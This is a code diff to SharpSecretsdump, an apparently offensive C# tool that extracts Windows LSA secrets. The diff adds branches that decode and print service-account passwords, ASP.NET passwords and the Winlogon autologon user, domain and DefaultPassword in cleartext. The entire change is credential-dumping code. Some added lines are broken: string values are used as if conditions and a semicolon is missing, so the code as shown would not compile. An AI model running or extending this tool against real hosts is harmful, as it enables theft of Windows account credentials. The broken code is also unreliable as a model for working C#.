@@ -238,17 +238,41 @@ namespace SharpSecretsdump
                                     else if (secret.ToUpper().StartsWith("_SC_"))
                                     {
                                         string startName = Encoding.ASCII.GetString(GetRegKeyValue($"SYSTEM\\ControlSet001\\Services\\{secret.Substring(4)}", "ObjectName")).Trim('\0');
-                                        string pw = Encoding.Unicode.GetString(secretBlob.secret.ToArray());
+                                        string pw = Encoding.Unicode.GetString(secretBlob.secret);
                                         Console.WriteLine($"{startName}:{pw}");
                                     }
                                     else if (secret.ToUpper().StartsWith("ASPNET_WP_PASSWORD"))
                                     {
-                                        Console.WriteLine("ASPNET:" + System.Text.Encoding.Unicode.GetString(secretBlob.secret));
+                                        Console.WriteLine($"ASPNET:{Encoding.Unicode.GetString(secretBlob.secret)}");
+                                    }
+                                    else if (secret.ToUpper().StartsWith("DEFAULTPASSWORD"))
+                                    {
+                                        string username = Encoding.ASCII.GetString(GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultUserName"));
+                                        string domain = Encoding.ASCII.GetString(GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultDomainName"));
+                                        string password = Encoding.ASCII.GetString(GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword"));
+                                        if (username)
+                                        {
+                                            username = username.Remove(username.Length - 1);
+                                        }
+                                        else
+                                        {
+                                            username = "(Unkown User)"
+                                        }
+                                        if (domain)
+                                        {
+                                            domain = domain.Remove(domain.Length - 1);
+                                            username = $"{domain}\\{username}";
+                                        }
+                                        Console.WriteLine($"{secret}: {username}:{Encoding.Unicode.GetString(secretBlob.secret)}");
+                                        if (password)
+                                        {
+                                            Console.WriteLine($"{secret}: {username}:{password}");
+                                        }
                                     }
                                     else
                                     {
-                                        Console.WriteLine("[!] Secret type not supported yet - outputing raw secret as unicode:");
-                                        Console.WriteLine(Encoding.Unicode.GetString(secretBlob.secret));
+                                        Console.WriteLine("[!] Secret type not supported yet - outputing raw secret as hex");
+                                        Console.WriteLine($"{secret}: {Hexlify(secretBlob.secret)}");
                                     }
                                 }
                             }
@@ -281,8 +305,8 @@ namespace SharpSecretsdump
         {
             byte[] salt = Encoding.UTF8.GetBytes($"{domainName.ToUpper()}host{computerName.ToLower()}.{domainName.ToLower()}");
 
-            Encoding UTF16 = Encoding.GetEncoding(System.Text.UnicodeEncoding.Unicode.CodePage, new EncoderReplacementFallback(), new DecoderReplacementFallback("�"));
-            Encoding UTF8 = Encoding.GetEncoding(System.Text.UnicodeEncoding.UTF8.CodePage, new EncoderReplacementFallback("?"), new DecoderReplacementFallback());
+            Encoding UTF16 = Encoding.GetEncoding(UnicodeEncoding.Unicode.CodePage, new EncoderReplacementFallback(), new DecoderReplacementFallback("�"));
+            Encoding UTF8 = Encoding.GetEncoding(UnicodeEncoding.UTF8.CodePage, new EncoderReplacementFallback("?"), new DecoderReplacementFallback());
 
             byte[] rawSecret = UTF8.GetBytes(UTF16.GetString(secret));
 
